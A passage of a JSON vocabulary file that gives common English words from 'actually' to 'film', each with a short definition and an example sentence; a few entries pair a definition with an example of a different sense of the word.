        "definition": "as the truth or facts of a situation; really",
        "example": "She was surprised to find that he was actually quite nice."
    },
    "addition": {
        "definition": "the action or process of adding something to something else",
        "example": "The addition of spices improved the flavor of the dish."
    },
    "address": {
        "definition": "the particulars of the place where someone lives or an organization is situated",
        "example": "She wrote the address on the envelope."
    },
    "administration": {
        "definition": "the process or activity of running a business, organization, etc.",
        "example": "The administration of the company decided to implement new policies."
    },
    "admit": {
        "definition": "confess to be true or to be the case",
        "example": "He had to admit that he was wrong."
    },
    "adult": {
        "definition": "a person who is fully grown or developed",
        "example": "As an adult, he took on more responsibilities."
    },
    "affect": {
        "definition": "have an effect on; make a difference to",
        "example": "The new law will affect thousands of people."
    },
    "after": {
        "definition": "in the time following an event or another period of time",
        "example": "They went for a walk after dinner."
    },
    "again": {
        "definition": "another time; once more",
        "example": "She read the book again."
    },
    "against": {
        "definition": "in opposition to",
        "example": "The players were determined to win against all odds."
    },
    "agency": {
        "definition": "a business or organization providing a particular service",
        "example": "They hired an agency to help with the marketing campaign."
    },
    "agent": {
        "definition": "a person who acts on behalf of another",
        "example": "She contacted her agent to discuss her next project."
    },
    "agreement": {
        "definition": "harmony or accordance in opinion or feeling",
        "example": "They finally reached an agreement after hours of negotiation."
    },
    "ahead": {
        "definition": "in or toward the front",
        "example": "He looked ahead and saw the finish line."
    },
    "air": {
        "definition": "the invisible gaseous substance surrounding the earth, a mixture mainly of oxygen and nitrogen",
        "example": "The fresh air felt invigorating."
    },
    "all": {
        "definition": "used to refer to the whole quantity or extent of a particular group or thing",
        "example": "She ate all the cookies."
    },
    "allow": {
        "definition": "give (someone) permission to do something",
        "example": "The teacher decided to allow the students extra time to complete the test."
    },
    "almost": {
        "definition": "not quite; very nearly",
        "example": "She almost missed the bus."
    },
    "alone": {
        "definition": "having no one else present; on one's own",
        "example": "He felt alone in the big city."
    },
    "along": {
        "definition": "moving in a constant direction on (a path or any more or less horizontal surface)",
        "example": "They walked along the beach."
    },
    "already": {
        "definition": "before or by now or the time in question",
        "example": "She was already at the office when I arrived."
    },
    "also": {
        "definition": "in addition; too",
        "example": "She enjoys swimming and also likes to play tennis."
    },
    "although": {
        "definition": "in spite of the fact that; even though",
        "example": "Although it was raining, they went for a hike."
    },
    "always": {
        "definition": "at all times; on all occasions",
        "example": "She always remembers my birthday."
    },
    "American": {
        "definition": "relating to or characteristic of the United States or its inhabitants",
        "example": "She loves American culture and traditions."
    },
    "among": {
        "definition": "surrounded by; in the company of",
        "example": "He found himself among friends at the party."
    },
    "amount": {
        "definition": "a quantity of something",
        "example": "She measured the amount of sugar needed for the recipe."
    },
    "analysis": {
        "definition": "detailed examination of the elements or structure of something",
        "example": "The scientist's analysis of the data revealed important findings."
    },
    "animal": {
        "definition": "a living organism that feeds on organic matter, typically having specialized sense organs and nervous system",
        "example": "The animal roamed freely in the forest."
    },
    "another": {
        "definition": "used to refer to an additional person or thing of the same type as one already mentioned or known",
        "example": "She decided to have another cup of coffee."
    },
    "answer": {
        "definition": "a thing said, written, or done to deal with or as a reaction to a question, statement, or situation",
        "example": "He waited for an answer to his question."
    },
    "anyone": {
        "definition": "any person or people",
        "example": "Anyone can join the club if they are interested."
    },
    "anything": {
        "definition": "used to refer to a thing, no matter what",
        "example": "She couldn't find anything in the messy drawer."
    },
    "appear": {
        "definition": "come into sight; become visible or noticeable",
        "example": "The sun began to appear over the horizon."
    },
    "apply": {
        "definition": "make a formal application or request",
        "example": "He decided to apply for the scholarship."
    },
    "approach": {
        "definition": "come near or nearer to (someone or something) in distance or time",
        "example": "The cat cautiously approached the bird."
    },
    "area": {
        "definition": "a region or part of a town, a country, or the world",
        "example": "They explored the area around the city."
    },
    "argue": {
        "definition": "give reasons or cite evidence in support of an idea, action, or theory, typically with the aim of persuading others to share one's view",
        "example": "They often argue about politics."
    },
    "arm": {
        "definition": "each of the two upper limbs of the human body from the shoulder to the hand",
        "example": "He injured his arm while playing soccer."
    },
    "around": {
        "definition": "located or situated on every side",
        "example": "They sat around the campfire."
    },
    "arrive": {
        "definition": "reach a place at the end of a journey or a stage in a journey",
        "example": "She was excited to finally arrive at the destination."
    },
    "article": {
        "definition": "a piece of writing included with others in a newspaper, magazine, or other publication",
        "example": "He wrote an article about the latest technology trends."
    },
    "artist": {
        "definition": "a person who creates paintings or drawings as a profession or hobby",
        "example": "The artist displayed her work at the gallery."
    },
    "as": {
        "definition": "used in comparisons to refer to the extent or degree of something",
        "example": "She is as tall as her brother."
    },
    "ask": {
        "definition": "say something in order to obtain an answer or some information",
        "example": "She decided to ask for directions."
    },
    "assume": {
        "definition": "suppose to be the case, without proof",
        "example": "He tends to assume the worst in every situation."
    },
    "at": {
        "definition": "expressing location or arrival in a particular place or position",
        "example": "They are waiting at the bus stop."
    },
    "attention": {
        "definition": "notice taken of someone or something; the regarding of someone or something as interesting or important",
        "example": "The teacher called for the students' attention."
    },
    "author": {
        "definition": "a writer of a book, article, or report",
        "example": "She is the author of several bestselling novels."
    },
    "available": {
        "definition": "able to be used or obtained; at someone's disposal",
        "example": "The product is available in different colors."
    },
    "avoid": {
        "definition": "keep away from or stop oneself from doing (something)",
        "example": "He tried to avoid making the same mistake again."
    },
    "away": {
        "definition": "to or at a distance from a particular place, person, or thing",
        "example": "They moved away from the noisy city."
    },
    "baby": {
        "definition": "a very young child, especially one newly or recently born",
        "example": "The baby giggled happily."
    },
    "back": {
        "definition": "the rear surface of the human body from the shoulders to the hips",
        "example": "He had a tattoo on his back."
    },
    "bad": {
        "definition": "of poor quality or a low standard",
        "example": "The food at the restaurant was really bad."
    },
    "bag": {
        "definition": "a flexible container with an opening at the top, used for carrying things",
        "example": "She packed her bag for the trip."
    },
    "ball": {
        "definition": "a solid or hollow spherical or egg-shaped object that is kicked, thrown, or hit in a game",
        "example": "They played catch with a ball in the park."
    },
    "bank": {
        "definition": "the land alongside or sloping down to a river or lake",
        "example": "They sat on the bank of the river."
    },
    "bar": {
        "definition": "a long rod or rigid piece of wood, metal, or similar material, typically used as an obstruction, fastening, or weapon",
        "example": "The window was secured with an iron bar."
    },
    "base": {
        "definition": "the lowest part or edge of something, especially the part on which it rests or is supported",
        "example": "The lamp had a sturdy base."
    },
    "be": {
        "definition": "exist",
        "example": "She will be here soon."
    },
    "beat": {
        "definition": "strike (a person or an animal) repeatedly and violently so as to hurt or injure them",
        "example": "He managed to beat the high score."
    },
    "beautiful": {
        "definition": "pleasing the senses or mind aesthetically",
        "example": "The sunset over the ocean was beautiful."
    },
    "because": {
        "definition": "for the reason that; since",
        "example": "She was late because of the traffic."
    },
    "become": {
        "definition": "begin to be",
        "example": "He wants to become a doctor when he grows up."
    },
    "before": {
        "definition": "during the period of time preceding (a particular event or time)",
        "example": "She had never seen a rainbow before."
    },
    "begin": {
        "definition": "start; perform or undergo the first part of (an action or activity)",
        "example": "They decided to begin the project immediately."
    },
    "behavior": {
        "definition": "the way in which one acts or conducts oneself, especially toward others",
        "example": "Her behavior at the meeting was very professional."
    },
    "behind": {
        "definition": "at or to the back of",
        "example": "She left her phone behind."
    },
    "believe": {
        "definition": "accept (something) as true; feel sure of the truth of",
        "example": "He couldn't believe his eyes."
    },
    "benefit": {
        "definition": "an advantage or profit gained from something",
        "example": "There are many benefits to eating healthy."
    },
    "best": {
        "definition": "of the most excellent or desirable type or quality",
        "example": "She is the best singer in the group."
    },
    "better": {
        "definition": "of a more excellent or effective type or quality",
        "example": "He is feeling better after taking the medicine."
    },
    "between": {
        "definition": "at, into, or across the space separating (two objects or regions)",
        "example": "She sat between her friends."
    },
    "beyond": {
        "definition": "at or to the further side of",
        "example": "The house is beyond the hill."
    },
    "big": {
        "definition": "of considerable size, extent, or intensity",
        "example": "They bought a big house in the countryside."
    },
    "bill": {
        "definition": "a printed or written statement of the money owed for goods or services",
        "example": "He paid the electricity bill online."
    },
    "billion": {
        "definition": "the number equivalent to the product of a thousand million",
        "example": "The company is worth several billion dollars."
    },
    "bit": {
        "definition": "a small piece, part, or quantity of something",
        "example": "He took a bit of the chocolate cake."
    },
    "black": {
        "definition": "of the very darkest color owing to the absence of or complete absorption of light; the opposite of white",
        "example": "She wore a black dress to the party."
    },
    "blood": {
        "definition": "the red liquid that circulates in the arteries and veins of humans and other vertebrate animals, carrying oxygen to and carbon dioxide from the tissues of the body",
        "example": "He donated blood at the hospital."
    },
    "blue": {
        "definition": "of a color intermediate between green and violet, as of the sky or sea on a sunny day",
        "example": "The sky was a clear, bright blue."
    },
    "board": {
        "definition": "a long, thin, flat piece of wood or other hard material, used for floors or other building purposes",
        "example": "They replaced the old board on the deck."
    },
    "body": {
        "definition": "the physical structure of a person or an animal, including the bones, flesh, and organs",
        "example": "He took good care of his body by exercising regularly."
    },
    "book": {
        "definition": "a written or printed work consisting of pages glued or sewn together along one side and bound in covers",
        "example": "She borrowed a book from the library."
    },
    "born": {
        "definition": "brought into life",
        "example": "She was born in a small village."
    },
    "both": {
        "definition": "used to refer to two people or things, regarded and identified together",
        "example": "Both of them enjoyed the movie."
    },
    "box": {
        "definition": "a container with a flat base and sides, typically square or rectangular and having a lid",
        "example": "She opened the box to see what was inside."
    },
    "boy": {
        "definition": "a male child or youth",
        "example": "The boy played with his toys."
    },
    "break": {
        "definition": "separate or cause to separate into pieces as a result of a blow, shock, or strain",
        "example": "She managed to break the old record."
    },
    "bring": {
        "definition": "take or go with (someone or something) to a place",
        "example": "He decided to bring a gift to the party."
    },
    "brother": {
        "definition": "a man or boy in relation to other sons and daughters of his parents",
        "example": "She has a younger brother."
    },
    "budget": {
        "definition": "an estimate of income and expenditure for a set period of time",
        "example": "They planned their budget for the upcoming year."
    },
    "build": {
        "definition": "construct (something) by putting parts or material together",
        "example": "They decided to build a new house."
    },
    "building": {
        "definition": "a structure with a roof and walls, such as a house or factory",
        "example": "The new office building is very modern."
    },
    "business": {
        "definition": "a person's regular occupation, profession, or trade",
        "example": "He started his own business last year."
    },
    "but": {
        "definition": "used to introduce a phrase or clause contrasting with what has already been mentioned",
        "example": "She wanted to go, but she had to work."
    },
    "buy": {
        "definition": "obtain in exchange for payment",
        "example": "They decided to buy a new car."
    },
    "by": {
        "definition": "identifying the agent performing an action",
        "example": "The book was written by a famous author."
    },
    "call": {
        "definition": "give (a baby or animal) a specified name",
        "example": "They decided to call their new puppy Max."
    },
    "camera": {
        "definition": "a device for recording visual images in the form of photographs, film, or video signals",
        "example": "He bought a new camera for his trip."
    },
    "campaign": {
        "definition": "an organized course of action to achieve a goal",
        "example": "They launched a campaign to raise awareness about the issue."
    },
    "can": {
        "definition": "be able to",
        "example": "She can speak three languages fluently."
    },
    "cancer": {
        "definition": "a disease caused by an uncontrolled division of abnormal cells in a part of the body",
        "example": "They are conducting research to find a cure for cancer."
    },
    "candidate": {
        "definition": "a person who applies for a job or is nominated for election",
        "example": "She is a candidate for the upcoming elections."
    },
    "capital": {
        "definition": "the city or town that functions as the seat of government and administrative center of a country or region",
        "example": "They visited the capital city during their vacation."
    },
    "car": {
        "definition": "a road vehicle, typically with four wheels, powered by an internal combustion engine and able to carry a small number of people",
        "example": "He bought a new car for his daily commute."
    },
    "card": {
        "definition": "a small rectangular piece of thick paper or plastic, typically used for writing or printing on",
        "example": "He handed her a business card."
    },
    "care": {
        "definition": "the provision of what is necessary for the health, welfare, maintenance, and protection of someone or something",
        "example": "She takes great care of her pets."
    },
    "career": {
        "definition": "an occupation undertaken for a significant period of a person's life and with opportunities for progress",
        "example": "He chose a career in medicine."
    },
    "carry": {
        "definition": "support and move (someone or something) from one place to another",
        "example": "She decided to carry the heavy box herself."
    },
    "case": {
        "definition": "an instance of a particular situation; an example of something occurring",
        "example": "In this case, we need to rethink our strategy."
    },
    "catch": {
        "definition": "capture or seize, especially after a chase",
        "example": "He managed to catch the last train."
    },
    "cause": {
        "definition": "a person or thing that gives rise to an action, phenomenon, or condition",
        "example": "The cause of the fire is still unknown."
    },
    "cell": {
        "definition": "the smallest structural and functional unit of an organism, typically microscopic and consisting of cytoplasm and a nucleus enclosed in a membrane",
        "example": "The scientist studied the structure of the cell."
    },
    "center": {
        "definition": "the point that is equally distant from every point on the circumference of a circle or sphere",
        "example": "They met at the center of the park."
    },
    "central": {
        "definition": "of, at, or forming the center",
        "example": "The central issue in the debate was economic policy."
    },
    "century": {
        "definition": "a period of one hundred years",
        "example": "The building has stood for over a century."
    },
    "certain": {
        "definition": "able to be firmly relied on to happen or be the case",
        "example": "She was certain that she had locked the door."
    },
    "certainly": {
        "definition": "used to emphasize the speaker's belief that what is said is true",
        "example": "He is certainly the best candidate for the job."
    },
    "chair": {
        "definition": "a separate seat for one person, typically with a back and four legs",
        "example": "She sat on the chair by the window."
    },
    "chance": {
        "definition": "a possibility of something happening",
        "example": "There is a chance of rain tomorrow."
    },
    "change": {
        "definition": "make or become different",
        "example": "They decided to change their plans at the last minute."
    },
    "character": {
        "definition": "the mental and moral qualities distinctive to an individual",
        "example": "He has a strong character and is very reliable."
    },
    "charge": {
        "definition": "demand (an amount) as a price from someone for a service rendered or goods supplied",
        "example": "They charge a fee for their services."
    },
    "check": {
        "definition": "examine (something) in order to determine its accuracy, quality, or condition, or to detect the presence of something",
        "example": "He decided to check the details before signing the contract."
    },
    "child": {
        "definition": "a young human being below the age of puberty or below the legal age of majority",
        "example": "The child played happily in the garden."
    },
    "choice": {
        "definition": "an act of selecting or making a decision when faced with two or more possibilities",
        "example": "She made a choice to pursue her dreams."
    },
    "choose": {
        "definition": "pick out or select (someone or something) as being the best or most appropriate of two or more alternatives",
        "example": "He decided to choose the blue shirt."
    },
    "church": {
        "definition": "a building used for public Christian worship",
        "example": "They attended the church service every Sunday."
    },
    "citizen": {
        "definition": "a legally recognized subject or national of a state or commonwealth, either native or naturalized",
        "example": "She became a citizen of the country last year."
    },
    "city": {
        "definition": "a large town",
        "example": "They moved to the city for better job opportunities."
    },
    "civil": {
        "definition": "relating to ordinary citizens and their concerns, as distinct from military or ecclesiastical matters",
        "example": "The protest was a civil demonstration for rights."
    },
    "claim": {
        "definition": "state or assert that something is the case, typically without providing evidence or proof",
        "example": "He made a claim that he was the rightful heir."
    },
    "class": {
        "definition": "a set or category of things having some property or attribute in common and differentiated from others by kind, type, or quality",
        "example": "They were in the same class at school."
    },
    "clear": {
        "definition": "easy to perceive, understand, or interpret",
        "example": "The instructions were clear and easy to follow."
    },
    "clearly": {
        "definition": "in a clear manner",
        "example": "She spoke clearly so everyone could understand."
    },
    "close": {
        "definition": "move or cause to move so as to cover an opening",
        "example": "He decided to close the window because it was cold."
    },
    "coach": {
        "definition": "a person who trains and directs the members of a sports team",
        "example": "The coach prepared the team for the match."
    },
    "cold": {
        "definition": "of or at a low or relatively low temperature, especially when compared with the temperature of the human body",
        "example": "She shivered in the cold wind."
    },
    "collection": {
        "definition": "the action or process of collecting someone or something",
        "example": "He has a collection of vintage cars."
    },
    "college": {
        "definition": "an educational institution or establishment, in particular one providing higher education or specialized professional or vocational training",
        "example": "She graduated from college with honors."
    },
    "color": {
        "definition": "the property possessed by an object of producing different sensations on the eye as a result of the way it reflects or emits light",
        "example": "The painting was full of vibrant color."
    },
    "come": {
        "definition": "move or travel toward or into a place thought of as near or familiar to the speaker",
        "example": "He will come to the party later."
    },
    "commercial": {
        "definition": "concerned with or engaged in commerce",
        "example": "They launched a new commercial on television."
    },
    "common": {
        "definition": "occurring, found, or done often; prevalent",
        "example": "It is common to see snow in the winter."
    },
    "community": {
        "definition": "a group of people living in the same place or having a particular characteristic in common",
        "example": "The community came together to support the event."
    },
    "company": {
        "definition": "a commercial business",
        "example": "She works for a software company."
    },
    "compare": {
        "definition": "estimate, measure, or note the similarity or dissimilarity between",
        "example": "It\u2019s interesting to compare the two artists' styles."
    },
    "computer": {
        "definition": "an electronic device for storing and processing data, typically in binary form, according to instructions given to it in a variable program",
        "example": "He bought a new computer for gaming."
    },
    "concern": {
        "definition": "relate to; be about",
        "example": "The report concerns the safety of the product."
    },
    "condition": {
        "definition": "the state of something with regard to its appearance, quality, or working order",
        "example": "The car is in excellent condition."
    },
    "conference": {
        "definition": "a formal meeting for discussion",
        "example": "They attended the annual business conference."
    },
    "Congress": {
        "definition": "the national legislative body of a country",
        "example": "The new law was passed by Congress."
    },
    "consider": {
        "definition": "think carefully about (something), typically before making a decision",
        "example": "She decided to consider all her options before making a decision."
    },
    "consumer": {
        "definition": "a person who purchases goods and services for personal use",
        "example": "The company conducts regular surveys to understand consumer preferences."
    },
    "contain": {
        "definition": "have or hold (someone or something) within",
        "example": "The box contains various tools."
    },
    "continue": {
        "definition": "persist in an activity or process",
        "example": "They decided to continue their journey despite the weather."
    },
    "control": {
        "definition": "the power to influence or direct people's behavior or the course of events",
        "example": "The new manager has taken control of the project."
    },
    "cost": {
        "definition": "an amount that has to be paid or spent to buy or obtain something",
        "example": "The cost of living has increased significantly."
    },
    "could": {
        "definition": "used to indicate possibility",
        "example": "She could be the one who solves the problem."
    },
    "country": {
        "definition": "a nation with its own government, occupying a particular territory",
        "example": "They traveled to a new country every summer."
    },
    "couple": {
        "definition": "two individuals of the same sort considered together",
        "example": "The couple celebrated their anniversary."
    },
    "course": {
        "definition": "the route or direction followed by a ship, aircraft, road, or river",
        "example": "The ship changed its course due to the storm."
    },
    "court": {
        "definition": "a tribunal presided over by a judge, judges, or a magistrate in civil and criminal cases",
        "example": "She was summoned to appear in court."
    },
    "cover": {
        "definition": "put something such as a cloth or lid on top of or in front of (something) in order to protect or conceal it",
        "example": "She used a blanket to cover herself."
    },
    "create": {
        "definition": "bring (something) into existence",
        "example": "She loves to create art in her free time."
    },
    "crime": {
        "definition": "an action or omission that constitutes an offense that may be prosecuted by the state and is punishable by law",
        "example": "The crime rate in the city has decreased."
    },
    "cultural": {
        "definition": "relating to the ideas, customs, and social behavior of a society",
        "example": "They attended various cultural events during their trip."
    },
    "culture": {
        "definition": "the arts and other manifestations of human intellectual achievement regarded collectively",
        "example": "She is fascinated by Japanese culture."
    },
    "cup": {
        "definition": "a small bowl-shaped container for drinking from, typically having a handle",
        "example": "He drank a cup of coffee in the morning."
    },
    "current": {
        "definition": "belonging to the present time; happening or being used or done now",
        "example": "She is up to date with current events."
    },
    "customer": {
        "definition": "a person or organization that buys goods or services from a store or business",
        "example": "The store values its loyal customers."
    },
    "cut": {
        "definition": "make an opening, incision, or wound in (something) with a sharp-edged tool or object",
        "example": "She used scissors to cut the paper."
    },
    "dark": {
        "definition": "with little or no light",
        "example": "The room was dark and quiet."
    },
    "data": {
        "definition": "facts and statistics collected together for reference or analysis",
        "example": "The scientist analyzed the data from the experiment."
    },
    "daughter": {
        "definition": "a girl or woman in relation to either or both of her parents",
        "example": "She is proud of her daughter\u2019s achievements."
    },
    "day": {
        "definition": "a period of twenty-four hours as a unit of time, reckoned from one midnight to the next, corresponding to a rotation of the earth on its axis",
        "example": "They spent the day at the beach."
    },
    "dead": {
        "definition": "no longer alive",
        "example": "The flowers were dead after the frost."
    },
    "deal": {
        "definition": "an agreement entered into by two or more parties for their mutual benefit, especially in a business or political context",
        "example": "They struck a deal to collaborate on the project."
    },
    "death": {
        "definition": "the end of the life of a person or organism",
        "example": "They mourned the death of a loved one."
    },
    "debate": {
        "definition": "a formal discussion on a particular matter in a public meeting or legislative assembly, in which opposing arguments are put forward",
        "example": "The debate about climate change continues."
    },
    "decade": {
        "definition": "a period of ten years",
        "example": "The town has changed a lot over the past decade."
    },
    "decide": {
        "definition": "come to a resolution in the mind as a result of consideration",
        "example": "They decided to go on a trip."
    },
    "decision": {
        "definition": "a conclusion or resolution reached after consideration",
        "example": "She made a decision to switch careers."
    },
    "deep": {
        "definition": "extending far down from the top or surface",
        "example": "The lake is very deep in the middle."
    },
    "defense": {
        "definition": "the action of defending from or resisting attack",
        "example": "The city\u2019s defense was strong."
    },
    "degree": {
        "definition": "the amount, level, or extent to which something happens or is present",
        "example": "She earned a degree in engineering."
    },
    "Democrat": {
        "definition": "a member of the Democratic Party in the United States",
        "example": "He is a proud Democrat and actively participates in local politics."
    },
    "democratic": {
        "definition": "relating to or supporting democracy or its principles",
        "example": "The country held democratic elections last year."
    },
    "describe": {
        "definition": "give an account in words of (someone or something), including all the relevant characteristics, qualities, or events",
        "example": "Can you describe the scene in detail?"
    },
    "design": {
        "definition": "a plan or drawing produced to show the look and function or workings of a building, garment, or other object before it is made",
        "example": "She sketched a design for a new dress."
    },
    "despite": {
        "definition": "without being affected by; in spite of",
        "example": "Despite the rain, they went for a walk."
    },
    "detail": {
        "definition": "an individual feature, fact, or item",
        "example": "She explained the plan in detail."
    },
    "determine": {
        "definition": "ascertain or establish exactly, typically as a result of research or calculation",
        "example": "They need to determine the cause of the problem."
    },
    "develop": {
        "definition": "grow or cause to grow and become more mature, advanced, or elaborate",
        "example": "She wants to develop her skills further."
    },
    "development": {
        "definition": "the process of developing or being developed",
        "example": "The development of new technologies is rapid."
    },
    "difference": {
        "definition": "a point or way in which people or things are dissimilar",
        "example": "There is a significant difference between the two proposals."
    },
    "different": {
        "definition": "not the same as another or each other; unlike in nature, form, or quality",
        "example": "They have different opinions on the matter."
    },
    "difficult": {
        "definition": "needing much effort or skill to accomplish, deal with, or understand",
        "example": "The test was very difficult."
    },
    "dinner": {
        "definition": "the main meal of the day, taken either around midday or in the evening",
        "example": "They had a delicious dinner together."
    },
    "direction": {
        "definition": "a course along which someone or something moves",
        "example": "They walked in the direction of the park."
    },
    "director": {
        "definition": "a person who is in charge of an activity, department, or organization",
        "example": "The director of the company made an important announcement."
    },
    "discover": {
        "definition": "find (something or someone) unexpectedly or in the course of a search",
        "example": "They hope to discover new species of plants."
    },
    "discuss": {
        "definition": "talk about (something) with another person or group of people",
        "example": "They met to discuss the upcoming project."
    },
    "discussion": {
        "definition": "the action or process of talking about something in order to reach a decision or to exchange ideas",
        "example": "The discussion was productive and insightful."
    },
    "disease": {
        "definition": "a disorder of structure or function in a human, animal, or plant, especially one that produces specific signs or symptoms or that affects a specific location and is not simply a direct result of physical injury",
        "example": "They are researching a cure for the disease."
    },
    "do": {
        "definition": "perform (an action, the precise nature of which is often unspecified)",
        "example": "She has a lot of work to do today."
    },
    "doctor": {
        "definition": "a person who is qualified to treat people who are ill",
        "example": "She visited the doctor for a check-up."
    },
    "door": {
        "definition": "a hinged, sliding, or revolving barrier at the entrance to a building, room, or vehicle, or in the framework of a cupboard",
        "example": "He opened the door and went inside."
    },
    "down": {
        "definition": "toward or in a lower place or position, especially to or on the ground or another surface",
        "example": "She walked down the stairs carefully."
    },
    "draw": {
        "definition": "produce (a picture or diagram) by making lines and marks on paper with a pencil, pen, etc.",
        "example": "She loves to draw landscapes."
    },
    "dream": {
        "definition": "a series of thoughts, images, and sensations occurring in a person's mind during sleep",
        "example": "He had a strange dream last night."
    },
    "drive": {
        "definition": "operate and control the direction and speed of a motor vehicle",
        "example": "She learned how to drive last summer."
    },
    "drop": {
        "definition": "let or make (something) fall vertically",
        "example": "He accidentally dropped his phone."
    },
    "drug": {
        "definition": "a substance that has a physiological effect when ingested or otherwise introduced into the body",
        "example": "They developed a new drug to treat the illness."
    },
    "during": {
        "definition": "throughout the course or duration of (a period of time)",
        "example": "They visited many places during their vacation."
    },
    "each": {
        "definition": "used to refer to every one of two or more people or things, regarded and identified separately",
        "example": "Each student received a certificate."
    },
    "early": {
        "definition": "happening or done before the usual or expected time",
        "example": "They decided to arrive early to avoid the crowd."
    },
    "east": {
        "definition": "the direction toward the point of the horizon where the sun rises, or the part of the horizon lying in this direction",
        "example": "The sun rises in the east."
    },
    "easy": {
        "definition": "achieved without great effort; presenting few difficulties",
        "example": "The instructions were easy to follow."
    },
    "eat": {
        "definition": "put (food) into the mouth and chew and swallow it",
        "example": "They went out to eat at a restaurant."
    },
    "economic": {
        "definition": "relating to economics or the economy",
        "example": "They discussed the country's economic policies."
    },
    "economy": {
        "definition": "the wealth and resources of a country or region, especially in terms of the production and consumption of goods and services",
        "example": "The economy has been growing steadily."
    },
    "edge": {
        "definition": "the outside limit of an object, area, or surface",
        "example": "She stood at the edge of the cliff."
    },
    "education": {
        "definition": "the process of receiving or giving systematic instruction, especially at a school or university",
        "example": "She values education and lifelong learning."
    },
    "effect": {
        "definition": "a change which is a result or consequence of an action or other cause",
        "example": "The new law had an immediate effect on the economy."
    },
    "effort": {
        "definition": "a vigorous or determined attempt",
        "example": "She put a lot of effort into her project."
    },
    "eight": {
        "definition": "equivalent to the product of two and four; one more than seven",
        "example": "There are eight apples in the basket."
    },
    "either": {
        "definition": "used before the first of two (or occasionally more) alternatives that are being specified (the other being introduced by \u2018or\u2019)",
        "example": "You can choose either tea or coffee."
    },
    "election": {
        "definition": "a formal and organized choice by vote of a person for a political office or other position",
        "example": "The presidential election is scheduled for next year."
    },
    "else": {
        "definition": "in addition; besides",
        "example": "Would you like anything else?"
    },
    "employee": {
        "definition": "a person employed for wages or salary, especially at non-executive level",
        "example": "The company hired a new employee."
    },
    "end": {
        "definition": "the final part of something, especially a period of time, an activity, or a story",
        "example": "They worked until the end of the day."
    },
    "energy": {
        "definition": "the strength and vitality required for sustained physical or mental activity",
        "example": "She has a lot of energy in the morning."
    },
    "enjoy": {
        "definition": "take delight or pleasure in (an activity or occasion)",
        "example": "They enjoy spending time together."
    },
    "enough": {
        "definition": "as much or as many as required",
        "example": "She had enough time to finish her work."
    },
    "enter": {
        "definition": "come or go into (a place)",
        "example": "They entered the building quietly."
    },
    "entire": {
        "definition": "with no part left out; whole",
        "example": "She read the entire book in one day."
    },
    "environment": {
        "definition": "the surroundings or conditions in which a person, animal, or plant lives or operates",
        "example": "They are working to protect the environment."
    },
    "environmental": {
        "definition": "relating to the natural world and the impact of human activity on its condition",
        "example": "They discussed environmental issues at the conference."
    },
    "especially": {
        "definition": "used to single out one person, thing, or situation over all others",
        "example": "She loves all animals, especially dogs."
    },
    "establish": {
        "definition": "set up (an organization, system, or set of rules) on a firm or permanent basis",
        "example": "They decided to establish a new company."
    },
    "even": {
        "definition": "used to emphasize something surprising or extreme",
        "example": "He didn\u2019t even say goodbye."
    },
    "evening": {
        "definition": "the period of time at the end of the day, usually from about 6 p.m. to bedtime",
        "example": "They went for a walk in the evening."
    },
    "event": {
        "definition": "a thing that happens, especially one of importance",
        "example": "They attended a major sporting event."
    },
    "ever": {
        "definition": "at any time",
        "example": "Have you ever been to Paris?"
    },
    "every": {
        "definition": "used before a singular noun to refer to all the individual members of a set without exception",
        "example": "Every student has a unique talent."
    },
    "everybody": {
        "definition": "every person",
        "example": "Everybody enjoyed the party."
    },
    "everyone": {
        "definition": "every person",
        "example": "Everyone is welcome to join the meeting."
    },
    "everything": {
        "definition": "all things",
        "example": "She packed everything she needed for the trip."
    },
    "evidence": {
        "definition": "the available body of facts or information indicating whether a belief or proposition is true or valid",
        "example": "They found new evidence to support their theory."
    },
    "exactly": {
        "definition": "in a precise manner; accurately",
        "example": "She knew exactly what to do."
    },
    "example": {
        "definition": "a thing characteristic of its kind or illustrating a general rule",
        "example": "She provided an example to clarify her point."
    },
    "executive": {
        "definition": "a person with senior managerial responsibility in a business organization",
        "example": "He is an executive at a major corporation."
    },
    "exist": {
        "definition": "have objective reality or being",
        "example": "Do you believe that ghosts exist?"
    },
    "expect": {
        "definition": "regard (something) as likely to happen",
        "example": "They expect the delivery to arrive tomorrow."
    },
    "experience": {
        "definition": "practical contact with and observation of facts or events",
        "example": "She gained valuable experience during her internship."
    },
    "expert": {
        "definition": "a person who is very knowledgeable about or skillful in a particular area",
        "example": "He is an expert in computer science."
    },
    "explain": {
        "definition": "make (an idea, situation, or problem) clear to someone by describing it in more detail or revealing relevant facts or ideas",
        "example": "She explained the rules of the game to the new players."
    },
    "eye": {
        "definition": "each of a pair of globular organs in the head through which people and vertebrate animals see",
        "example": "He has blue eyes."
    },
    "face": {
        "definition": "the front part of a person's head from the forehead to the chin, or the corresponding part in an animal",
        "example": "She has a friendly face."
    },
    "fact": {
        "definition": "a thing that is known or proved to be true",
        "example": "It is a fact that the Earth orbits the Sun."
    },
    "factor": {
        "definition": "a circumstance, fact, or influence that contributes to a result",
        "example": "Several factors influenced their decision."
    },
    "fail": {
        "definition": "be unsuccessful in achieving one's goal",
        "example": "He was afraid he might fail the test."
    },
    "fall": {
        "definition": "move downward, typically rapidly and freely without control, from a higher to a lower level",
        "example": "The leaves fall from the trees in autumn."
    },
    "family": {
        "definition": "a group consisting of parents and children living together in a household",
        "example": "They spent the holidays with their family."
    },
    "far": {
        "definition": "at, to, or by a great distance (used to indicate the extent to which one thing is distant from another)",
        "example": "She lives far away from the city."
    },
    "fast": {
        "definition": "moving or capable of moving at high speed",
        "example": "He ran fast to catch the bus."
    },
    "father": {
        "definition": "a man in relation to his child or children",
        "example": "Her father taught her how to ride a bike."
    },
    "fear": {
        "definition": "an unpleasant emotion caused by the threat of danger, pain, or harm",
        "example": "He had a fear of heights."
    },
    "federal": {
        "definition": "having or relating to a system of government in which several states form a unity but remain independent in internal affairs",
        "example": "The federal government passed new legislation."
    },
    "feel": {
        "definition": "experience (an emotion or sensation)",
        "example": "She feels happy today."
    },
    "feeling": {
        "definition": "an emotional state or reaction",
        "example": "He had a feeling of excitement before the concert."
    },
    "few": {
        "definition": "a small number of",
        "example": "Only a few people attended the meeting."
    },
    "field": {
        "definition": "an area of open land, especially one planted with crops or pasture, typically bounded by hedges or fences",
        "example": "They played soccer in the field."
    },
    "fight": {
        "definition": "take part in a violent struggle involving the exchange of physical blows or the use of weapons",
        "example": "They had a fight over a disagreement."
    },
    "figure": {
        "definition": "a number, especially one which forms part of official statistics or relates to the financial performance of a company",
        "example": "The sales figures were impressive."
    },
    "fill": {
        "definition": "cause (a space or container) to become full or almost full",
        "example": "She decided to fill the glass with water."
    },
    "film": {
